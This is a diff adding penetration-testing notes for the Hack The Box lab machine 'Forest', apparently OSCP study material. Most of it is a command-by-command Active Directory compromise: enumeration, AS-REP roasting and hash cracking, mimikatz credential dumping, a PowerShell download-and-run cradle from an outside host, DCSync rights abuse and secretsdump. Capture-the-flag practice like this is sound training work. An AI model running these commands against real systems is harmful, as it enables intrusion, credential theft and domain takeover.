@@ -1,0 +1,143 @@
+### Enumeration
+```
+IP=10.10.10.10
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p -A $IP
+nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
+```
+### Ports
+- Banner Grab: nc -nv $IP PORT
+- 53
+	- DNS
+- 88
+	- kerberos
+- 135
+	- RPC
+- 139
+	- RPC
+- 389
+	- Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+- 445
+	- smb
+- 464
+	- kpasswd5
+- 593
+	- RPC
+- 636
+	- tcpwrapped
+- 3268
+	- Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+- 3269
+	- tcpwrapped
+- 5985
+	- winrm
+- 9389
+	- .NET Message Framing
+- 47001
+	- RPC
+- 49152-49158
+	- RPC
+- 49169
+	- RPC
+- 49170
+	- RPC
+- 49179
+	- RPC
+### Foothold
+- 21
+	- ftp anonymous@$IP
+	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
+- DNS
+	- nslookup
+		- server $IP
+		- 127.0.0.1
+	- dig @10.10.10.161 htb.local
+		- resolves
+	- dig @10.10.10.161 forest.htb.local
+		- resolves
+	- dig axfr @10.10.10.161 htb.local
+		- transfer failed
+- RPC/ SMB
+	- enum4linux $IP
+	- crackmapexec smb $IP -u guest -p "" --rid-brute
+	- crackmapexec smb $IP -u "" -p "" --pass-pol
+	- rpcclient -U '' $IP
+		- enumdomusers
+			- `user:[sebastien] rid:[0x479]
+			- `user:[lucinda] rid:[0x47a]
+			- `user:[svc-alfresco] rid:[0x47b]  
+			- `user:[andy] rid:[0x47e]                
+			- `user:[mark] rid:[0x47f]                
+			- `user:[santi] rid:[0x480]
+		- enumdomgroups
+			- `group:[Domain Admins] rid:[0x200]
+		- querygroupmem 0x200
+			- `rid:[0x1f4] attr:[0x7]
+			- queryuser 0x1f4
+				- Administrator
+		- queryusergroups RID
+		- queryuser RID
+	- Put all found users into users.txt
+	- `for user in $(cat users.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
+		- Receive TGT from svc-alfresco
+			- hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
+				- s3rvice
+- 445
+	- smbclient -N -L //$IP
+		- anonymous login success,  no shares
+	- nmap --script smb-vuln* -p135,139,445 $IP
+- svc-alfresco  -  s3rvice
+	- evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+		- Connected
+### PE
+#### Windows
+- svc-alfresco
+	- whoami /all
+	- Root drive directory
+	- net user USERNAME
+		- Check group memberships
+	- systeminfo
+		- `./wes.py ~/OSCP/boxes/BOX_NAME/systeminfo.txt  > ~/OSCP/boxes/BOX_NAME/systeminfo_exploits.txt`
+	- history
+		- (Get-PSReadLineOption).HistorySavePath
+	- Users with console
+	- Services
+		- PS1: `Get-Service | Select-Object -Property Name, DisplayName, Status
+		- Unquoted
+			- cmd
+				- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+				- wmic service get name,displayname,pathname
+			- PS1
+				- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+			- icacls Filepath before .exe
+				- Looking for W or F
+	- netstat -ano
+		- Active ports
+	- mimkatz
+		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+	- Bloodhound
+		- Download
+			- `iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")
+		- Gather files
+			- `invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
+		- Move zip to A and load into bloodhound
+		- Find shortest path to domain admin
+			- Join Exchange Windows Generic all
+				- Allows us to add member to group
+				- net group "Exchange Windows Permissions" svc-alfresco /add /domain
+			- Exchange Windows Writedacl over domain
+				- Attack Option 1
+					- Give DCSync permission
+						- `$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force 
+						- `$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword) Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
+						- Command `Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
+				- Attack Option 2
+					- aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161
+					- Also adds them to DCSync. 
+			- Now we can secrets dump
+				- impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161
+					- Dumps everything
+### Credentials
+### Lessons Learned
